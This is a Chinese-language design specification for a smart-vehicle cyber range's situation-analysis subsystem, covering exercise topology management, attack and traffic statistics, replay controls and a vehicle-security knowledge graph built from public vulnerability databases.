统为试验拓扑数据提供了先进的动态变化管理功能，具备对于试验中拓扑节点与关系结构的实时变化的重构和管理的功能。这一功能旨在帮助用户适应试验过程中拓扑的动态性，确保系统能够灵活应对网络结构的变化。首先，系统支持动态变化的试验拓扑数据。随着试验的进行，网络拓扑结构可能发生变化，包括设备的添加、删除、连接关系的调整等。系统能够实时监测这些变化，确保试验拓扑数据与实际网络状态保持同步，提供准确的拓扑信息。其次，系统具备试验拓扑节点与关系结构的重构和管理功能。当试验中发生拓扑变化时，用户可以方便地进行重构，包括新增、编辑和删除节点，调整节点之间的关系结构等。这种灵活的管理方式使得用户能够根据试验需要随时调整拓扑结构，确保其与试验目标和实际情况的一致性。系统提供直观的图形界面，用户可以通过图形拖拽、添加按钮等方式进行拓扑节点的操作，同时通过节点属性编辑进行详细设置。此外，系统还提供了历史变更记录，方便用户追溯试验拓扑结构的演变过程，帮助他们更好地理解试验中的网络变化。综合而言，系统通过支持基于动态变化的试验拓扑数据进行节点与关系结构的重构与管理，为用户提供了一套强大的拓扑管理工具。这一功能的详细和灵活性确保了用户在试验过程中能够始终掌握拓扑状态，更好地应对变化和调整。</p></li><li><p>系统提供了强大的试验数据采集和统计功能，特别支持对试验中的基础攻击与复杂攻击的数据采集和数量统计。这一功能旨在帮助用户全面了解试验中安全状况，以及攻击事件的类型和频率。首先，系统能够高效采集试验中的基础攻击与复杂攻击数据。基础攻击通常包括常见的网络扫描、简单的恶意流量等，而复杂攻击则可能涉及更高级的威胁，例如零日漏洞利用、高级持续性威胁（APT）等。系统通过实时监测网络流量、审计系统日志等方式，确保对这些攻击事件进行全面而准确的采集。其次，系统进行数量统计，汇总基础攻击与复杂攻击的数据，以便用户能够迅速了解攻击事件的发生情况。统计结果涵盖攻击的种类、频率、攻击者来源等关键信息，为用户提供了直观的安全态势概览。这使得用户能够在试验过程中实时监测攻击事件的发生，并及时做出相应决策以确保试验的顺利进行。系统还提供了详尽的报告功能，用户可以根据需要生成定制化的基础攻击与复杂攻击报告。这些报告包括攻击事件的详细描述、影响范围、攻击者的行为模式等信息，帮助用户更深入地分析攻击事件，制定更有效的安全对策。</p></li><li><p>系统提供了强大的靶向检测数据采集和统计功能，支持用于监控试验中的靶向检测数据采集运行状态与最近数据接收时间的统计。这一功能旨在帮助用户全面了解靶向检测的执行情况，确保安全检测的及时性和准确性。首先，系统能够高效采集试验中靶向检测的数据。通过实时监控靶向检测模块的运行状态，系统确保能够及时捕捉到靶向检测的执行情况。这包括检测的目标、策略配置、检测结果等关键信息。其次，系统进行靶向检测运行状态与最近数据接收时间的统计。通过对靶向检测模块的运行状态进行实时统计，用户可以了解每个检测任务的执行状态，包括任务是否正在运行、是否已完成等。同时，系统还统计最近一次成功接收靶向检测数据的时间，帮助用户确保数据采集的及时性。系统提供直观的图表和报告，使用户能够轻松了解靶向检测的整体运行状况。这包括检测任务的数量、成功完成的任务比例、最近一次数据接收时间的分布等统计信息。用户可以通过这些数据追踪靶向检测的执行情况，及时发现潜在的问题并采取相应的措施。此外，系统还支持定制化的提醒和通知功能，当靶向检测出现异常或超时时，系统能够及时通知用户，以便及时调整和解决问题，确保试验的正常进行。总体而言，系统通过支持试验中靶向检测数据的采集运行状态与最近数据接收时间的统计，为用户提供了一套全面的靶向检测监控工具。</p></li><li><p>系统提供了全面的试验中流量分析数据统计功能，包括协议占比统计等关键指标。这一功能旨在帮助用户深入了解试验中网络流量的特征，以便更好地优化网络性能、监测异常流量以及制定合理的网络安全策略。首先，系统能够高效地采集试验中的流量数据。通过实时监测网络流量，系统能够捕获到各种协议的数据包，包括HTTP、FTP、TCP、UDP等。这确保了系统能够全面而准确地收集试验中的流量信息。其次，系统进行流量分析数据统计，其中一个关键指标是协议占比统计。通过对不同协议的流量进行分类和分析，用户可以清晰了解试验中各种协议的使用情况。协议占比统计提供了关于流量分布的直观图表和详细报告，使用户能够了解各种协议在整体流量中的比例，为网络性能优化提供了有力的数据支持。系统还支持更细致的流量分析，包括源IP和目标IP的通信模式、流量峰值时间、数据包大小分布等多方面的数据统计。这些详细的统计信息使用户能够深入了解网络流量的特性，迅速识别并应对潜在的网络问题。为了更好地呈现统计结果，系统提供直观的图形界面，用户可以通过图表和图形化报告深入分析流量数据。此外，系统还支持导出数据，方便用户进一步处理和共享分析结果。</p></li><li><p>系统提供了强大的试验中有效攻击检测数据数量统计功能，旨在帮助用户全面了解试验过程中有效攻击的发生情况，为网络安全提供准确的评估和决策支持。首先，系统通过实时监测网络流量和审计系统日志等手段，高效采集试验中的有效攻击检测数据。有效攻击通常包括各种恶意行为，如恶意软件传播、漏洞利用、未授权访问等。系统确保捕捉到这些攻击事件的相关信息，包括攻击类型、攻击者IP、目标IP等。其次，系统进行有效攻击检测数据数量的统计。通过对有效攻击事件进行分类和分析，系统为用户提供了直观的统计图表和详细的报告。统计结果涵盖了有效攻击的数量、类型分布、攻击者的行为模式等关键信息。这使用户能够全面了解试验中有效攻击的整体态势。系统还提供了实时更新的攻击事件列表，用户可以随时查看最新的有效攻击数据。这有助于用户及时响应和处理攻击事件，确保网络的安全性。</p></li><li><p>系统提供了全面的试后回放处理功能，通过回放数据实现对试验过程的回放，对试验过程进行深入分析和评估。这一功能旨在帮助用户在试验结束后对整个过程进行审查、调整和改进。首先，系统支持试后回放，用户可以选择特定时间段或整个试验过程的数据进行回放。通过回放数据，用户可以重现试验中的各个阶段，包括网络流量、攻击事件、设备状态等，为进一步分析提供了真实的场景还原。其次，系统提供了丰富的回放数据处理工具。用户可以在回放过程中暂停、加速、减速，以便更仔细地观察特定时刻的网络情况。此外，系统支持对特定事件的定位和重放，帮助用户深入了解试验中的重要事件和变化。系统还支持回放数据的多维度分析，用户可以选择特定的参数进行筛选和对比。例如，可以选择特定设备、特定协议或特定时间范围进行分析，以便更好地理解试验中的关键信息。</p></li><li><p>系统提供了灵活而强大的试后回放处理功能，允许用户选择时间段、选择回放速度对态势数据进行回放。这一回放功能覆盖了基础攻击和复杂攻击两个方面，旨在帮助用户全面审查试验过程中的安全态势，深入了解攻击事件的发生和网络响应。首先，系统支持选择时间段进行回放。用户可以灵活地选择试验中感兴趣的特定时间段，无论是整个试验过程还是某个特定的阶段。通过选择时间段进行回放，用户能够更精准地定位和分析试验中的关键事件，以便更深入地了解网络安全态势的演变。其次，系统提供了回放速度的可调节功能。用户可以根据需要调整回放速度，包括加速、减速或暂停。这使得用户能够更灵活地观察网络流量、攻击事件等细节，便于更全面地审查试验过程中的网络状态和攻击行为。</p></li><li><p>系统在试后回放处理功能中提供了高度灵活的回放时间段选择，允许用户自由选择试验开始时间与试验结束之间的任意时间段进行回放。这一功能旨在让用户能够有选择性地关注试验中的特定时期，以更详细地审查和分析网络活动、攻击事件和系统状态。系统允许用户在回放过程中选择试验开始时间与试验结束之间的任意时间段。这使得用户可以灵活定位和审查试验中的关键事件，集中关注特定时期内的网络流量、攻击行为以及设备状态的变化。用户可以自定义回放的时间范围，以满足不同场景下的审查需求。</p></li><li><p>系统支持对数据的快放处理，提供了多种倍速选择，包括1.5x、2x、3x、4x。这一功能旨在使用户能够更加灵活地进行回放操作，快速浏览试验中的网络流量、攻击事件和系统状态的变化。首先，用户可以在回放过程中选择合适的倍速进行快放处理。倍速选项包括1.5x、2x、3x、4x，用户可以根据需要选择适当的倍速，以加速回放过程。这使得用户能够在较短的时间内快速浏览试验的整个过程，捕捉到网络活动和攻击事件的变化。其次，系统提供直观的界面，用户可以通过简单的操作轻松切换快放倍速。交互式的界面设计确保用户可以在回放过程中随时调整倍速，以适应不同的审查需求。这种直观的操作方式有助于提高用户体验，使其更加便捷地掌控试验中的数据回放。快放处理不仅提供了高效的回放方式，而且还有助于用户在有限时间内更全面地审查试验过程中的关键事件。用户可以在快放过程中更精准地定位和观察网络流量、攻击行为，从而更深入地理解试验的网络安全态势。</p></li><li><p>系统支持对数据的慢放处理，提供了慢放倍速为0.5x的选项。这一功能旨在让用户能够更仔细地审查试验中的网络流量、攻击事件和系统状态的变化，以确保不错过任何关键信息。首先，用户可以在回放过程中选择慢放倍速为0.5x。这样的慢放处理使得试验中的数据回放速度减缓，用户能够更细致入微地观察每一时刻的网络活动。这对于深入理解试验中的复杂情况、分析攻击事件的详细信息以及准确定位关键时刻十分有益。其次，系统提供直观的界面，用户可以通过简单的操作轻松切换慢放倍速。交互式的设计确保用户可以在回放过程中随时调整倍速，以适应不同的审查需求。这种直观的操作方式有助于提高用户体验，使其更加便捷地掌控试验中的数据回放。</p></li><li><p>系统提供了对回放任务的灵活启动与停止控制操作，以满足用户在审查试验数据时的定制需求。这一功能旨在让用户能够全面掌控回放过程，随时根据需要进行操作。首先，用户可以通过系统界面或指定的控制命令启动回放任务。系统提供直观且易用的启动按钮或命令接口，用户可以轻松地发起回放过程。启动回放任务后，系统会按照用户选择的时间段和回放速度，逐步还原试验中的网络活动和攻击事件。其次，系统同样提供了停止控制操作，用户可以在任何时刻通过系统界面或命令中断回放任务。这一操作的灵活性使得用户能够在需要深入观察某一时刻、进行详细分析或者切换到其他任务时随时停止回放。停止控制确保了用户对回放任务的完全掌控，使其能够根据实际需求精确控制回放的进程。为了增加用户的操作便利性，系统还支持快速启动和停止的功能。用户可以在快节奏的工作环境中迅速调整回放任务的状态，以适应不同的审查需求。这种快速启停的灵活性让用户能够更高效地利用试验数据进行审查和分析。</p></li><li><p>系统具备强大的靶场多试验任务并行处理与分析功能，旨在提高靶场试验的效率和灵活性。这一功能集成了多任务并行处理和分析的机制，确保用户能够同时进行多个试验的数据处理和审查，从而更全面地了解网络安全态势。首先，系统支持靶场内多个试验任务的并行处理。用户可以同时启动和管理靶场中的多个试验，系统会智能分配资源，确保每个试验任务都能够充分利用计算和存储资源。这使得用户能够更高效地处理多个试验任务，提高整体的试验效率。其次，系统提供了多试验数据并行分析的能力。用户可以在同一时间窗口内对多个试验的数据进行分析，无需等待单个试验分析完成。这样的并行分析机制有助于用户在同一界面下综合考察不同试验的结果，便于发现横向和纵向的网络安全模式和趋势。系统还支持灵活的任务优先级调整，用户可以根据具体需求灵活设置不同试验任务的处理优先级，确保重要任务能够优先获得资源，而不影响其他任务的正常进行。这种任务优先级的灵活调整机制提高了系统的适应性，能够满足不同试验任务之间的差异化需求。</p></li></ol><h4 id="性能实施方案-23"><a href="#性能实施方案-23" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统设计和性能优化能够支持高达100个试验的并行控制与管理，确保用户在大规模靶场环境中能够高效地处理、监控和分析多个试验任务。</li></ol><h4 id="技术实现内容-23"><a href="#技术实现内容-23" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-10"><a href="#方案设计-10" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持智能汽车应用试验基础信息的自动与手动同步管理，涵盖夺旗赛、攻防赛、红蓝对抗、综合演练等，依此索引开展任务。监测并管理汽车应用试验分析状态，基于试验操作指令自动转换状态。</p><p>试验前配置资产漏洞探测策略，包括探测范围。试验前资产漏洞探测启停指令控制，可重复探测。配置靶向检测策略，针对试验前攻击子图生成与注册控制。试验相关数据概括呈现，包括试验关联队伍、靶标、设备数据和安全攻防数据统计与展示。同步管理应用关联靶标信息，修改补充靶标信息。</p><p>统一同步并管理参与试验的队伍信息。统一同步并管理试验拓扑内节点设备，进行重构与管理。试验中基础攻击与复杂攻击数据采集数量统计。试验中靶向检测数据采集运行状态与数据接收时间统计。试验中流量分析数据统计。试验中有效攻击检测数据数量统计。试验结束后进行回放处理，选择时间段、回放速度进行态势数据回放。回放时间段选择试验开始与结束间任意时间段。支持数据快放、慢放处理。回放任务的启停控制。支持靶场多试验任务并行处理与分析。</p><p>性能参数为，系统支持100个试验并行控制管理。</p><p>本方案旨在构建一个高效、精准的汽车应用试验综合管理系统，用于实现试验基础信息的同步管理、试验状态的监测与管理、试验前配置、数据概括呈现、靶标信息管理、试验拓扑管理、数据采集与统计、试验回放处理以及多试验任务并行处理与分析等多种功能。系统将支持高达100个试验任务的并行控制管理，满足高并发的网络安全试验场景需求。</p><p>模块具备基础信息同步管理功能，支持自动与手动同步管理，系统能够支持自动与手动同步试验的基础信息，覆盖夺旗赛、攻防赛、红蓝对抗、综合演练等多种模式，确保试验任务的准确性和及时性。</p><p>试验状态监测与管理</p><p>状态监测与转换：系统可基于试验操作指令自动进行状态转换，流畅地过渡试前、试中、试后的各个阶段，确保试验的连续性和有效性。</p><p>试验前配置</p><p>资产漏洞探测策略：用户可配置资产漏洞探测策略，包括探测范围，以便精确识别潜在风险。</p><p>漏洞探测指令控制：支持试验前资产漏洞探测的启动与停止指令控制，允许反复进行探测以确保准确性。</p><p>靶向检测策略：用户可根据需要配置靶向检测策略，包括攻击类型等，以便针对性地进行攻击检测。</p><p>攻击子图生成与注册：基于试验资产漏洞探测数据与网络安全攻击知识，系统将自动生成试验相关的场景知识图谱，并将攻击子图注册到有效的攻击检测系统中。</p><p>数据概括呈现</p><p>试验相关数据展示：系统将支持试验相关数据的概括性呈现，涵盖试验关联队伍、靶标、设备相关数据，以及安全攻防数据的统计与直观展示。</p><p>靶标信息管理</p><p>靶标信息同步管理：系统将支持应用关联靶标信息的自动与手动同步统一管理，确保信息的准确性和一致性。</p><p>靶标信息修改补充：用户可对靶标信息进行修改和补充，包括虚拟靶标信息的同步展示以及实物靶标和单位靶标的新增、编辑和删除操作。</p><p>试验参与队伍管理</p><p>队伍信息管理：系统将统一同步并管理参与试验的队伍信息，支持队伍信息的新增、编辑、删除、批量导入&amp;导出功能。</p><p>试验拓扑管理</p><p>节点设备管理：支持统一同步并管理试验拓扑内的节点设备，包括虚拟设备和实物设备的信息同步展示，以及实物设备的新增、编辑和删除操作。</p><p>拓扑结构重构与管理：系统将支持基于动态变化的试验拓扑数据，进行节点与关系结构的重构与管理。</p><p>数据采集与统计</p><p>攻击数据统计：系统将支持试验中基础攻击与复杂攻击数据的采集数量统计。</p><p>靶向检测数据统计：支持靶向检测数据采集的运行状态与最近数据接收时间的统计。</p><p>流量分析数据统计：系统将支持试验中流量分析数据的统计，包括协议占比等。</p><p>有效攻击检测数据统计：支持试验中有效攻击检测数据数量的统计。</p><p>试验回放处理</p><p>试后回放：系统将支持试后数据的回放处理，以供用户对试验过程进行复盘分析。</p><p>回放时间段与速度选择：用户可选择任意试验时间段进行态势数据的回放，并可根据需求调整回放速度。</p><p>回放时间段选择：支持在试验开始时间与试验结束时间间的任意时间段选择进行数据回放。</p><p>快放处理：系统将支持数据的快放处理，倍速包括1.5x、2x、3x、4x。</p><p>慢放处理：支持数据的慢放处理，慢放倍速为0.5x。</p><p>回放控制操作：用户将能够控制回放任务的启动与停止。</p><p>多试验任务并行处理与分析</p><p>并行处理与分析：系统将支持靶场多试验任务的并行处理与分析，确保每个试验任务的独立性和系统整体的高效运作。</p><p>并行控制管理：系统支持100个试验任务的并行控制管理，确保能够处理大规模的试验需求。</p><p>本方案提出的汽车应用试验综合管理系统，通过其全面的功能和高性能的设计，将极大地提升试验的效率和精确度。系统的实施将为汽车网络安全试验提供强有力的技术支持，确保试验的高效进行和结果的准确性。</p><h5 id="方案介绍"><a href="#方案介绍" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>针对每一个试验任务，智能汽车网络靶场态势分析分系统需建立一个对应的态势分析任务，提供态势分析任务的管理界面，支持试验基础信息自动与手动同步管理，包括夺旗赛、攻防赛、红蓝对抗、综合演练等。支持对试验态势分析任务、参与队伍、成员及网络拓扑节点的集中管理，至多支持200个试验并行管理。支持试验分析状态的监测与管理，包括试前、试中、试后的转换，状态转换是根据试验操作指令自动进状态转换。且支持基于syslog安全事件日志自主修改安全事件融合与格式解析规则。</p><p>试验开始前，根据试验配置管理分系统同步的任务信息，可配置资产漏洞探测策略，涵盖探测范围。也可配置靶向检测策略，涵盖攻击类型。也可对靶标信息进行修改补充信息，从目标网络同步虚拟靶标信息进行展示、并且能够添加、修改以及删除单位靶标以及实物靶标。还可配置当前分系统的态势分析任务的人员信息和试验类型，除了传统的试验场景之外，对智能汽车业务仿真场景也支持相关态势分析配置与控制。应用关联靶标信息自动与手动同步统一管理，其中涵盖了单位靶标、实物靶标以及虚拟靶标。统一同步并管理参与试验的队伍信息，支持对试验的参与队伍进行添加、修改、删除、批量导入和导出的功能。统一同步并管理试验拓扑内的节点设备，包括虚拟设备和实物设备。支持从目标网络同步设备信息进行展示，且能够对添加、修改和删除实物设备。系统具备生成攻击子图的能力，并且支持相应的注册控制,基于网络安全攻击知识以及试验资产漏洞探测数据,系统可以产生试验相关场景知识图谱,并将攻击子图自动注册到有效攻击检测。可以动态变化的试验拓扑数据，进行试验拓扑节点与关系结构重构与管理。基于不同试验类型的场景，可规划态势的子任务，其中包括网络场景的流量检测、漏洞扫描、资产探测等，可进行资产漏洞探测启动与停止指令控制，态势分析的数据基础基于试前所配置的子任务，由用户自主选择单个试验需要采集、分析的数据。试验进行时，基于试前分配的子任务，实时基于采集数据进行态势分析检测，且支持在过程中控制分析的暂停或启动状态。靶场的多个试验环境是相互隔离进行的，数据采集、数据分析也是独立进行的。分系统支持多个试验并行处理分析及态势可视化展示，确保靶场多任务正常进行。可进行靶向检测数据采集运行状态、流量分析数据统计、基础攻击采集数量统计、最近数据接收时间统计、有效攻击检测数据数量统计以及复杂攻击数据采集数量统计等。</p><p>试验进行时，基于试前分配的子任务，实时基于采集数据进行态势分析检测，且支持在过程中控制分析的暂停或启动状态。靶场的多个试验环境是相互隔离进行的，数据采集、数据分析也是独立进行的。分系统支持多个试验并行处理分析及态势可视化展示，确保靶场多任务正常进行。可进行基础攻击与复杂攻击数据采集数量统计、最近数据接收时间统计、流量分析数据统计、靶向检测数据采集运行状态、有效攻击检测数据数量统计等。</p><p>试验结束后，可查看所有试验任务数据的态势可视化展示，掌握检测设备在线状态，试验相关数据概括呈现，包括靶标、基础攻击、有效攻击、复杂攻击、试验资产漏以及设备相关数据和试验关联队伍等。该模块还可支持试后回放,能够选择时间段、回放速度对态势数据进行回放,涵盖了复杂攻击的回放以及基础攻击的回放,试验开始时间与试验结束之间的任意时间段都可以进行回放,分快放和慢放,快放倍速为:1.5倍速、2倍速、3倍速、4倍速,慢放倍速为:0.5倍速,可进行启动以及停止回放。</p><p>基于态势分析控制管理模块的功能划分，该模块的主要元素包括试验管理和数据统计与展示管理，其中试验管理包含了试验状态控制和相关信息的管理，数据统计与展示管理包括数据采集和可视化展示的功能。所有在该模块配置的内容，均会直接关系到智能汽车网络靶场态势分析任务的实施与分析。</p><p>多试验任务处理子模块具备同时处理和分析靶场中多个试验任务的能力，确保高效而独立的任务执行。最高可进行150个试验的并行管理与控制。</p><p>详细子模块如下所示:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c7f50dd9c3f91c6f1e6648ba29510d5c.png"></p><h3 id="网络安全场景知识图谱模块"><a href="#网络安全场景知识图谱模块" class="headerlink" title="网络安全场景知识图谱模块"></a>网络安全场景知识图谱模块</h3><h4 id="功能实施方案-24"><a href="#功能实施方案-24" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>系统具备从互联网公开渠道获取结构化和非结构化智能汽车相关数据的强大功能，其中包括CVE（通用漏洞与漏洞）、CNNVD（中国国家信息安全漏洞库）、CNVD（中国国家信息安全漏洞共享平台）等多个权威数据源。这一功能的目标是使用户能够轻松获取最新的智能汽车安全信息，以支持系统的漏洞管理和安全评估。系统支持从互联网公开渠道抓取结构化的智能汽车相关数据，如CVE。这些数据以JSON、XML等通用数据文件格式呈现，确保了数据的结构化和易于解析。通过这种方式，用户能够快速获取关于智能汽车漏洞和安全事件的详细信息，包括漏洞描述、威胁级别、影响范围等关键信息。</p></li><li><p>系统支持基于标准规范模板，从大规模多源的信息中自动抽取知识要素，其中包括智能汽车漏洞知识、资产知识、攻击知识等多方面的关键信息。这一功能的目标是帮助用户高效地从庞大的信息流中提取并整理有关智能汽车安全的重要知识，以支持系统的漏洞管理、资产追踪和攻击分析。首先，系统采用标准规范模板，通过预定义的数据结构和语义标签，确保对不同来源的信息能够一致而有序地进行抽取。这种标准规范模板的使用，使得系统能够对来自不同数据源的信息进行统一的处理，确保了数据的一致性和可比性。其次，系统通过先进的自然语言处理和文本挖掘技术，实现对大规模多源信息的智能抽取。对于智能汽车漏洞知识，系统能够自动识别和提取漏洞的关键信息，如漏洞描述、影响范围和修复建议。对于资产知识，系统能够识别有关智能汽车资产的信息，包括型号、制造商、软件版本等。对于攻击知识，系统能够提取攻击手法、攻击目标和攻击来源等关键信息。系统支持灵活的配置和定制，用户可以根据特定需求调整规范模板和抽取策略，以适应不同的信息源和应用场景。这种灵活性保证了系统在不同领域和行业的适应性，能够满足用户多样化的知识抽取需求。最重要的是，系统能够自动更新规范模板，随时适应不断变化的信息环境。定期的模板更新机制确保系统能够捕捉新的数据结构和信息格式，使其能够持续有效地从多源信息中提取有关智能汽车安全的知识要素。</p></li><li><p>系统支持基于CVSS3标准进行漏洞分数与漏洞危害等级的关联与映射，以便用户能够准确评估和理解系统中的漏洞威胁，且能够支持调整配置参数，进行手动修正。CVSS3（Common Vulnerability Scoring System）是一种用于衡量漏洞严重性的行业标准，系统通过将漏洞分数与危害等级相关联，为用户提供了清晰的安全评估指标。首先，系统会根据CVSS3标准自动计算每个漏洞的分数，考虑了漏洞的基本评估因素，如攻击复杂性、受影响用户的范围、攻击向量等。这些因素综合体现了漏洞的风险程度，为用户提供了一个客观的分数评估。其次，系统将漏洞分数映射到相应的漏洞危害等级。这一关联关系使用户能够更直观地了解每个漏洞对系统安全的潜在威胁程度，有助于用户有针对性地制定漏洞修复策略和安全决策。同时，系统提供了可调整的配置参数，允许用户进行手动修正和调整。用户可以根据自身组织的特定安全策略、环境特征或行业标准，调整系统对CVSS3分数的映射关系，以更精准地匹配实际情况。这种手动修正的灵活性确保了系统的适应性，能够满足用户个性化的安全评估需求。</p></li><li><p>系统能够支持基于关键词对漏洞描述进行智能识别，以进行漏洞类型的分类关联补全。这一功能旨在帮助用户更迅速、准确地理解漏洞的性质和潜在威胁，从而更有针对性地制定有效的安全防护措施。首先，系统通过先进的自然语言处理技术，能够自动提取漏洞描述中的关键词和短语。这些关键词涵盖了漏洞的特征、攻击方式、受影响的系统等方面的信息。系统对这些关键词进行智能识别，确保了对漏洞描述的全面理解。其次，系统利用识别到的关键词对漏洞进行类型的分类关联。通过预定义的漏洞类型数据库和关键词映射规则，系统能够将漏洞与相应的漏洞类型关联起来，为用户提供了清晰的漏洞分类信息。这种自动分类关联补全的机制，使用户能够更迅速地了解漏洞的本质，加强对系统安全状况的把握。同时，系统提供了用户可定制的关键词映射功能，允许用户根据特定需求或行业标准进行自定义设置。这种灵活性确保了系统的适应性，能够应对不同行业或组织对漏洞分类的个性化要求。</p></li><li><p>系统支持从漏洞信息中抽取出汽车漏洞实体与汽车资产实体之间的关系，并能够基于攻击信息进行攻击与漏洞之间的关系抽取。这一功能旨在帮助用户深入理解汽车系统中的安全威胁，有效评估漏洞对汽车资产的潜在影响，并进一步分析攻击与漏洞之间的关联，以支持系统的安全防御和应急响应。首先，系统通过先进的实体关系抽取技术，能够自动识别漏洞信息中涉及的汽车漏洞实体和汽车资产实体。系统会深入分析漏洞描述、影响范围等关键信息，准确提取漏洞和资产的实体，并建立它们之间的关联关系。其次，系统支持在攻击信息中抽取攻击与漏洞之间的关系。通过分析攻击手法、攻击目标等攻击信息的关键元素，系统能够智能地识别攻击事件与相应漏洞之间的潜在联系。这有助于用户更全面地了解威胁背后的漏洞根本原因，为系统安全决策提供更有力的支持。同时，系统提供了灵活的关系可视化和查询功能，使用户能够在直观的界面下深入研究汽车漏洞、资产与攻击事件之间的复杂关系。用户可以通过交互式的界面，深入挖掘漏洞与资产的关系，了解攻击如何与特定漏洞关联，以更好地制定有效的安全对策。</p></li><li><p>系统支持基于多维数据关联分析，建立统一的知识表示规范，旨在形成一个全面而一致的知识体系，用于关联攻击、漏洞与资产之间的复杂关系。这一功能的目标是为用户提供更深层次的安全洞察，帮助他们全面理解安全事件背后的因果关系，从而更有效地制定和执行综合性的安全策略。首先，系统通过多维数据关联分析，综合考虑攻击、漏洞和资产等多方面信息。系统能够智能地整合来自不同数据源的信息，包括攻击手法、漏洞详情、资产配置等，形成一个全景的安全数据集。其次，系统建立统一的知识表示规范，通过定义一致的数据结构和语义标签，确保各种安全信息能够在同一框架下得到一致的表示。这一规范化的知识表示体系有助于消除信息孤岛，为用户提供一个通用的信息交互平台，使他们能够更加方便地进行跨数据源的关联分析。在这个统一的知识表示规范下，系统能够自动关联攻击、漏洞与资产之间的关系。通过智能的关联算法，系统可以发现攻击事件与特定漏洞、资产之间的潜在联系，为用户提供全面的威胁情报和漏洞分析结果。</p></li><li><p>系统支持在联网情况下自动进行汽车知识获取、抽取与更新，以确保用户始终能够获取到最新的汽车安全信息。系统利用先进的数据抽取技术，自动从获取的信息中提取有关汽车型号、零部件、漏洞、更新、制造商公告等关键知识要素。这确保了用户能够从庞大的信息流中迅速获取到与其车辆相关的重要信息，减少了信息处理的时间和精力成本。系统还具备自动更新机制，定期检查和同步汽车知识数据库，以确保用户获取的信息始终保持最新状态。这种自动化的更新过程使用户能够在任何时候都能够访问到最新的汽车安全信息，及时采取必要的安全措施。最重要的是，系统在联网情况下能够智能化地调整知识获取策略，根据用户的偏好和关注点，自动过滤和优先处理最相关的信息。这有助于用户更有针对性地了解与其车辆型号、制造商或使用环境相关的安全信息。</p></li><li><p>系统支持外网IP情报知识的离线获取与更新，同时能够关联IP所属国家与区域等相关属性，为用户提供全面的IP情报信息。这一功能的目标是帮助用户在离线环境中获取与分析外网IP相关的情报，支持安全分析与决策，并通过可视化展示使用户更直观地了解网络威胁。首先，系统通过连接到离线存储的IP情报数据库，实现对外网IP情报知识的离线获取。这包括IP地址的归属国家、区域、使用者等关键信息。系统确保用户能够在没有实时互联网连接的情况下访问最新的IP情报，提高了系统在离线环境下的适应性。其次，系统通过智能的关联算法，将获取到的IP情报与其所属国家、区域等相关属性进行关联。这种关联性使用户能够更全面地了解与分析网络中的IP活动，识别潜在的威胁源，并更有效地采取相应的安全措施。系统支持可视化展示，用户可以通过直观的图表和图形化界面深入分析IP情报。通过地理位置、国家分布等可视化方式，用户能够更容易地识别异常活动，从而更有针对性地进行网络监控和防御。最重要的是，系统提供了自动更新机制，确保IP情报数据库保持最新状态。即使在离线环境下，用户也能够在系统重新联网后及时获取到最新的IP情报知识，保证了系统的信息同步性。总体而言，系统通过支持外网IP情报知识的离线获取与更新，关联IP所属国家与区域等相关属性，并提供可视化展示，为用户提供了一套强大的网络安全分析工具。这一功能的离线支持和关联性确保了用户能够在各种环境下进行网络威胁分析和决策，保护网络安全。</p></li><li><p>系统支持基于抽取得到的资产知识、漏洞知识、攻击知识，构建汽车网络安全知识图谱，并提供知识更新的功能。这一功能旨在帮助用户建立全面而实时的汽车网络安全知识体系，为系统的安全分析、漏洞管理和威胁应对提供更深入的洞察力。首先，系统通过抽取资产、漏洞和攻击知识，自动建立汽车网络安全知识图谱的节点与关系。资产节点包括车辆、设备、系统等，漏洞节点包括已知漏洞信息，而攻击节点则涵盖不同攻击手法、攻击者等。系统根据抽取到的关联信息建立图谱中的边，形成一个复杂而全面的知识网络。其次，系统支持定期的知识更新机制，以确保知识图谱中的信息保持最新状态。通过连接到最新的漏洞数据库、安全威胁情报源等，系统能够自动获取新的资产、漏洞和攻击知识，更新图谱中的节点和关系，保障用户能够基于最新的信息做出安全决策。用户可以通过可视化界面浏览和查询汽车网络安全知识图谱，深入了解各种资产、漏洞和攻击之间的关联关系。这有助于用户更全面地了解汽车网络的整体安全状况，发现潜在的威胁，并有针对性地采取安全防护措施。最重要的是，系统提供了用户自定义知识图谱的功能，允许用户根据特定需求扩展图谱的内容，添加定制的节点和关系。这种灵活性确保了系统的适应性，能够满足不同用户和组织的特定安全分析需求。总体而言，系统通过支持基于抽取得到的资产知识、漏洞知识、攻击知识构建汽车网络安全知识图谱，并提供知识更新，为用户提供了一种强大的安全分析工具。这一功能的深度抽取、更新机制和可定制性确保了用户能够在不同场景下灵活应用知识图谱，更好地理解和管理汽车网络的安全状况。</p></li><li><p>系统支持资产知识管理，包括对操作系统、应用程序的产品名称、版本以及关联厂商等信息的有效管理。这一功能旨在帮助用户全面了解其汽车网络中的各类资产，并有效进行版本控制和漏洞管理，以提高整体网络安全性。首先，系统通过自动化的资产发现机制，能够识别和登记汽车网络中的各类资产，包括操作系统和应用程序。对于操作系统，系统记录其产品名称、版本等关键信息；对于应用程序，系统不仅关注其名称和版本，还能识别关联的厂商信息。其次，系统提供了用户友好的资产信息界面，使用户能够方便地查看和管理已登记的资产信息。用户可以轻松检索和过滤特定产品或版本，快速获取网络中存在的资产清单，为安全决策提供有力支持。系统还支持资产信息的关联管理，将操作系统和应用程序与漏洞、安全威胁等信息进行关联。这有助于用户更好地理解资产在网络中的风险状况，有针对性地进行漏洞修复和安全防护。最重要的是，系统具备自动化的资产信息更新机制。通过连接到最新的资产数据库和漏洞信息源，系统能够及时获取产品名称、版本等信息的更新，保持资产知识库的实时性。</p></li><li><p>系统支持漏洞知识管理，包括漏洞的CVE编号、危害等级、漏洞类型、威胁类型以及详细的漏洞描述等信息。这一功能旨在帮助用户系统地了解漏洞的特征、潜在危害以及与之关联的威胁类型，从而更有效地进行漏洞管理和威胁应对。首先，系统通过连接到公开漏洞数据库，获取最新的漏洞信息，包括每个漏洞的CVE编号、危害等级、漏洞类型、威胁类型等关键数据。系统确保这些信息在用户的漏洞知识库中得到及时更新。其次，系统提供了用户友好的漏洞信息管理界面，允许用户轻松浏览和检索漏洞信息。用户可以根据CVE编号、危害等级、漏洞类型、威胁类型等条件